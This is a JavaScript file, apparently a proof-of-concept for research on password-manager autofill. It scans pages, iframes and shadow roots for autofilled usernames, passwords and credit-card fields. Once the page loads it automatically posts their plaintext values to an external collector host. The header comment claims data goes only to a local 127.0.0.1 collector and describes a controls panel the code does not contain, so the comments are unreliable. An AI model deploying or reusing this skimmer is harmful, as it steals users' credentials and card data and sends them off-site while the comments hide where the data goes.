/*
  thirdparty_poc_controls.js
  --------------------------------------
  Self-contained third-party (same-origin) script that:
   - Injects a controls panel (Enable checkbox, interval select, manual scan, Test ID inputs, log area)
   - Scans for autofilled inputs and constructs a JSONL-schema-ready payload
   - Posts ONLY to http://127.0.0.1:8088/collect (local collector)
   - Keeps plaintext samples optional (default true here to match your snippet; toggle via window.TP_SEND_VALUE_SAMPLE)
  Usage:
    <script src="/thirdparty_poc_controls.js"></script>
  Optional runtime knobs (define before loading the script):
    window.TP_SEND_VALUE_SAMPLE = true|false;
    window.TP_DEFAULT_INTERVAL_MS = 3000;  // 1500|3000|5000 typical
    window.PWD_MANAGER = 'Chrome-built-in' // optional label for reports
*/
(function () {
  const LOCAL_COLLECTOR = 'https://collector.aac-telemetry.org/collect';
  const SEND_VALUE_SAMPLE = (typeof window.TP_SEND_VALUE_SAMPLE === 'boolean') ? window.TP_SEND_VALUE_SAMPLE : true;
  const DEFAULT_INTERVAL = Number(window.TP_DEFAULT_INTERVAL_MS || 3000);
  const USER_TZ = 'Asia/Taipei';

  const DEFAULT_TEST_ID = (function () {
    if (window.TEST_ID) return window.TEST_ID;
    const ymd = new Date().toISOString().slice(0, 10).replace(/-/g, '');
    return 'thirdParty_sameOrigin_' + ymd;
  })();

  // logging
  function log(msg) {
    const t = new Date().toLocaleTimeString('en-US', { hour12: false });
    console.log(`[PoC][${t}] ${msg}`);
  }

  (document.body ? Promise.resolve() : new Promise(r => addEventListener('DOMContentLoaded', r))).then(() => {
    if (!window.TEST_ID) window.TEST_ID = DEFAULT_TEST_ID;
    log('PoC loaded (Background mode) — start the collector on 127.0.0.1:8088.');
    log('Current Test ID: ' + window.TEST_ID);
  });

  // UA parse (lightweight)
  function parseUserAgent() {
    const ua = navigator.userAgent || '';
    let browser = 'unknown';
    if (/Edg\/(\d+\.\d+)/.test(ua)) browser = 'Edge';
    else if (/Chrome\/(\d+\.\d+)/.test(ua) && !/OPR\//.test(ua)) browser = 'Chrome';
    else if (/Firefox\/(\d+\.\d+)/.test(ua)) browser = 'Firefox';
    else if (/Safari\/(\d+\.\d+)/.test(ua)) browser = 'Safari';
    return { browser, ua };
  }

  // collect inputs (document + same-origin iframes + known shadow host tags)
  function collectAllInputs() {
    const out = [];
    out.push(...Array.from(document.querySelectorAll('input[autocomplete]')));
    const iframes = Array.from(document.querySelectorAll('iframe'));
    for (const fr of iframes) {
      try {
        const idoc = fr.contentDocument;
        if (!idoc) continue;
        const inputs = Array.from(idoc.querySelectorAll('input[autocomplete]'));
        inputs.forEach(inp => inp.___in_iframe = fr);
        out.push(...inputs);
      } catch (e) { }
    }

    const shadowHosts = Array.from(document.querySelectorAll('x-shadow-host, x-tp-shadow, x-shadow-host-thirdparty-cdn'));
    for (const host of shadowHosts) {
      try {
        const sr = host.shadowRoot;
        if (!sr) continue;
        const inputs = Array.from(sr.querySelectorAll('input[autocomplete]'));
        inputs.forEach(inp => inp.___shadow_host = host);
        out.push(...inputs);
      } catch (e) { }
    }
    return out;
  }

  // find autofilled
  function findAutofilledInputs() {
    const inputs = collectAllInputs();
    const results = [];
    for (const inp of inputs) {
      try {
        const ac = (inp.getAttribute('autocomplete') || '').toLowerCase();
        if (!(ac.includes('username') || ac.includes('current-password') || ac.includes('new-password') || ac.includes('cc-'))) continue;
        const val = inp.value || '';
        if (!val) continue;
        if (inp.dataset.exfiltrated === '1') continue;

        // Simplified technique detection: primarily rely on data-tech injected by load_technique.js
        const container = inp.closest('[data-tech]');
        let tech = null;
        if (inp.dataset && inp.dataset.tech) tech = inp.dataset.tech;
        else if (container && container.dataset.tech) tech = container.dataset.tech;
        else tech = 'unknown';
        results.push({
          name: inp.name || inp.id || '?',
          value: val,
          node: inp,
          tech,
          inputType: inp.type || null,
          autocomplete: ac
        });
      } catch (e) { }
    }
    return results;
  }

  async function safePostLocal(envelope) {
    const bodyStr = JSON.stringify(envelope);
    log('Sending payload: ' + bodyStr);
    try {
      const res = await fetch(LOCAL_COLLECTOR, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: bodyStr,
        keepalive: true
      });
      const text = await res.text().catch(() => '');
      if (!res.ok) { log(`Collector non-2xx: ${res.status} ${res.statusText} ${text}`); return { ok: false, status: res.status, text }; }
      log('Collector OK: ' + (text || '(no body)'));
      return { ok: true, status: res.status, text };
    } catch (e) {
      log('Send failed: ' + String(e)); return { ok: false, status: 'network-error', err: String(e) };
    }
  }

  function redactValue(v) {
    if (v === undefined || v === null) return '';
    const s = String(v); return s.length > 200 ? s.slice(0, 200) : s;
  }

  async function exfiltrateOnce() {
    const found = findAutofilledInputs();
    if (!found || found.length === 0) { log('Scan: no autofilled inputs found'); return; }

    const uaInfo = parseUserAgent();
    const caseId = window.CASE_ID || '';

    for (const f of found) {
      try { f.node.dataset.exfiltrated = '1'; } catch (e) { }
      const now = new Date();
      const local_ts = new Intl.DateTimeFormat('sv-SE', {
        year: 'numeric', month: '2-digit', day: '2-digit',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        hour12: false, timeZone: USER_TZ
      }).format(now).replace('T', ' ');
      const timestamp = (new Date()).toISOString().replace(/\.\d+Z$/, 'Z');

      const payload = {
        timestamp,
        local_ts,
        case_id: caseId,
        scenario: 'same-origin',
        browser: uaInfo.browser,
        // pm: window.PWD_MANAGER || 'unknown',
        input_type: f.inputType || null,
        technique: f.tech || null,
        value: SEND_VALUE_SAMPLE ? redactValue(f.value) : null
      };
      log(`Found field ${payload.input_type} (technique=${payload.technique}) — sending`);
      await safePostLocal(payload);
    }
  }

  let timer = null;
  function startScanning(intervalMs) {
    stopScanning();
    exfiltrateOnce(); // run immediately
    timer = setInterval(() => { exfiltrateOnce(); }, intervalMs);
    log(`Started scanning every ${intervalMs} ms`);
  }
  function stopScanning() {
    if (timer) { clearInterval(timer); timer = null; log('Stopped scanning'); }
  }

  // wire events - Cleanup
  window.addEventListener('load', () => {
    setTimeout(() => {
      startScanning(DEFAULT_INTERVAL);
    }, 1000);
  });
})();